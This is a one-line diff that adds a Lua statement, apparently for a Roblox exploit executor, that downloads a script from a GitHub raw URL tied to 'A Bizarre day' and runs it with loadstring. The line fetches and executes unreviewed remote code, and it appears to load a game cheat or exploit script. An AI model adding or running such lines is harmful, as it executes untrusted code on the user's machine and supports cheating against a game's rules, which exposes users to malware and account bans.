@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaijiKung/GG/master/A%20Bizarre%20day",true))();
